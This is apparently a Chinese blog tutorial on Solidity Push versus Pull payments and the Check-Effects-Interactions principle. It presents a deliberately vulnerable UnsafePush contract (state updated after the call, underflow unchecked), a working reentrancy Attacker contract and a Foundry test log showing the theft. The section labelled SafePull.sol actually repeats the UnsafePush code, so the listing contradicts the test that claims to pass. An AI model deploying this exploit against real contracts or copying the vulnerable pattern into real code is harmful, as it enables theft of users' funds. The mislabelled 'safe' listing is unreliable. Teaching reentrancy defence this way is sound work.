---
layout: post
title: 《纸上谈兵·solidity》第 16 课：Pull over Push 支付模式与 Check-Effects-Interactions 原则
tags: solidity
mermaid: false
math: false
--- 

从这一课开始，我们将会进入实战环节，通过编写测试来学习 Solidity 合约的各种高级用法。

## 引言

在智能合约中，资金转账是最常见、同时也是最容易出错的操作之一。
如果设计不当，合约可能遭遇 **重入攻击**、**Gas 限制问题**，甚至导致资金被锁死。

本课将带你深入理解两种支付模式：

* **Push（主动转账）**：合约把钱直接推给用户
* **Pull（用户主动领取）**：用户自己来提款

同时，我们会结合 Solidity 的经典安全设计原则 —— **Check-Effects-Interactions**，来构建安全的资金流动模式。

---

## 1. Push 支付模式的隐患

在 Push 模式下，合约直接在逻辑中调用 `transfer` 或 `call` 将资金打到用户地址：

```solidity
// ❌ 不安全的 Push 模式
function distribute(address payable user, uint256 amount) external {
    require(balances[user] >= amount, "Not enough balance");

    // 直接转账给用户
    (bool success, ) = user.call{value: amount}("");
    require(success, "Transfer failed");

    balances[user] -= amount;
}
```

问题在于：

1. **重入攻击**：如果用户是合约地址，它的 `receive` / `fallback` 函数可能会再次调用本合约，从而重入逻辑。
2. **Gas 限制**：有些合约接收 ETH 时需要执行额外逻辑，如果消耗的 Gas 超出 `transfer` / `send` 限制，就会失败，导致资金无法转出。
3. **失败传播**：只要一个用户收款失败，整个交易会回滚，影响其他用户。

---

## 2. Pull 支付模式的优势

Pull 模式中，合约不再主动转账，而是记录用户的可提余额，让用户自己来领取：

```solidity
// ✅ 安全的 Pull 模式
mapping(address => uint256) public balances;

function deposit() external payable {
    balances[msg.sender] += msg.value;
}

function withdraw() external {
    uint256 amount = balances[msg.sender];
    require(amount > 0, "No balance");

    balances[msg.sender] = 0; // ✅ 先更新状态
    (bool success, ) = msg.sender.call{value: amount}("");
    require(success, "Withdraw failed");
}
```

这样有几个优点：

* 用户主动领取，不依赖合约去 push 资金
* 即使转账失败，也只影响自己，不会影响其他人
* 结合 **Check-Effects-Interactions** 原则，可以抵御重入攻击

---

## 3. Check-Effects-Interactions 原则

这是 Solidity 中最经典的安全设计模式之一：

1. **Check**：检查输入和前置条件（`require`）
2. **Effects**：更新合约内部状态
3. **Interactions**：最后才与外部合约交互（转账、调用等）

应用在提款逻辑中：

```solidity
function withdraw() external {
    // 1. Check
    uint256 amount = balances[msg.sender];
    require(amount > 0, "No balance");

    // 2. Effects
    balances[msg.sender] = 0;

    // 3. Interactions
    (bool success, ) = msg.sender.call{value: amount}("");
    require(success, "Withdraw failed");
}
```

对比第 5 课里的 **重入攻击 Vault**，这里只需改变顺序，就能避免攻击。

---

## 4. Foundry 实战示例

我们用 Foundry 编写一个小测试来对比 **Push vs Pull** 的风险。

### 合约：UnsafePush.sol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract UnsafePush {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function getBalance(address user) external view returns (uint256) {
        return balances[user];
    }

    function distribute(address payable user, uint256 amount) external {
        require(balances[user] >= amount, "Not enough balance");
        // ❌ 先转账，后修改状态，容易被重入
        (bool success, ) = user.call{value: amount}("");
        require(success, "Transfer failed");
        unchecked {
            balances[user] -= amount;
        }
    }
}
```

在 Solidity 0.8+ 里，**算术运算默认开启了溢出/下溢检查**。上面的 `UnsafePush` 写的是：

```solidity
balances[user] -= amount;
```

在重入攻击里，这一行可能被重复执行，导致 `balances[user]` 变成 **负数**（下溢），于是编译器自动 `revert`，抛出 `panic: arithmetic underflow or overflow (0x11)`。

所以用 `unchecked { ... }` 关闭检查：

```solidity
function distribute(address payable user, uint256 amount) external {
    require(balances[user] >= amount, "Not enough balance");
    (bool success, ) = user.call{value: amount}("");
    require(success, "Transfer failed");
    unchecked {
        balances[user] -= amount; // ❌ 可能下溢，但不会 revert
    }
}
```

这样，遇到下溢时 `balances[user]` 会绕回到一个非常大的数（2^256-1 之类），不会再报错。

**⚠️ 注意**

* 这不是“安全的”写法，而是为了**演示漏洞**。
* 在教学中，这样做可以让重入攻击顺利进行，观察到 `attacker` 窃取资金，而不会因为 panic 被中断。
* 如果你是在写真实合约，绝对不要这么做。


### 攻击合约：Attacker.sol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./UnsafePush.sol";

contract Attacker {
    UnsafePush public target;
    uint256 public reentryCount;

    event Deposit(address indexed attacker, uint256 amount);

    constructor(address _target) {
        target = UnsafePush(_target);
    }

    function attack() external payable {
        target.deposit{value: msg.value}();
        emit Deposit(address(this), msg.value); // ✅ 改为打印合约自身
        target.distribute(payable(address(this)), msg.value);
    }

    receive() external payable {
        reentryCount++;
        uint256 targetBalance = address(target).balance;
        if (reentryCount < 3 && targetBalance > 0 ether) {
            target.distribute(payable(address(this)), msg.value);
        }
    }
}
```

### 安全合约：SafePull.sol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract UnsafePush {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function getBalance(address user) external view returns (uint256) {
        return balances[user];
    }

    function distribute(address payable user, uint256 amount) external {
        require(balances[user] >= amount, "Not enough balance");
        // ❌ 先转账，后修改状态，容易被重入
        (bool success, ) = user.call{value: amount}("");
        require(success, "Transfer failed");
        unchecked {
            balances[user] -= amount;
        }
    }
}
```

### 测试：PushVsPull.t.sol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/UnsafePush.sol";
import "../src/Attacker.sol";
import "../src/SafePull.sol";

contract PushVsPullTest is Test {
    UnsafePush push;
    SafePull pull;
    Attacker attacker;

    function setUp() public {
        push = new UnsafePush();
        pull = new SafePull();
        attacker = new Attacker(address(push));

        vm.deal(address(this), 10 ether);
    }

    function testReentrancyOnPush() public {
        // 受害者存入 5 ether
        push.deposit{value: 5 ether}();

        // 攻击者准备 1 ether 并发起攻击
        vm.deal(address(attacker), 1 ether);
        console.log("Attacker balance before attack:", address(attacker).balance);

        attacker.attack{value: 1 ether}();

        // 攻击者应能窃取更多资金
        assertGt(address(attacker).balance, 2 ether);
        console.log(
            "Attacker balance after attack:",
            address(attacker).balance
        );
    }

    function testSafePullWithdraw() public {
        pull.deposit{value: 1 ether}();

        // 正常提款
        pull.withdraw();

        assertEq(address(this).balance, 10 ether); // 提款成功
    }

    receive() external payable {}
}
```

运行测试：

```bash
➜  tutorial git:(main) ✗ forge test --match-path test/PushVsPull.t.sol -vvv

[⠊] Compiling...
[⠒] Compiling 1 files with Solc 0.8.30
[⠑] Solc 0.8.30 finished in 560.45ms
Compiler run successful!

Ran 2 tests for test/PushVsPull.t.sol:PushVsPullTest
[PASS] testReentrancyOnPush() (gas: 137093)
Logs:
  Attacker balance before attack: 1000000000000000000
  Attacker balance after attack: 4000000000000000000

[PASS] testSafePullWithdraw() (gas: 29940)
Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 1.00ms (164.71µs CPU time)

Ran 1 test suite in 152.91ms (1.00ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
```

你会看到：

* 在 Push 模式下，攻击者可以多次重入提款
* 在 Pull 模式下，提款流程安全，不受攻击影响

---

## 总结

1. **Push 模式 = 高风险**：转账时可能失败、被攻击或阻塞
2. **Pull 模式 = 推荐**：用户主动提取，安全性和灵活性更好
3. **Check-Effects-Interactions 原则**：
   * 检查条件
   * 更新状态
   * 最后才与外部交互

这是 Solidity 合约中最经典的安全设计模式之一，几乎所有涉及资金的逻辑都应该遵循。

---

<div align="center">
  <img src="../img/qrcode_wechat.jpg" alt="孟斯特">
</div>

> 声明：本作品采用[署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0)](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)进行许可，使用时请注明出处。  
> Author: [mengbin](mengbin1992@outlook.com)  
> blog: [mengbin](https://mengbin.top)  
> Github: [mengbin92](https://mengbin92.github.io/)  
> 腾讯云开发者社区：[孟斯特](https://cloud.tencent.com/developer/user/6649301)  
---
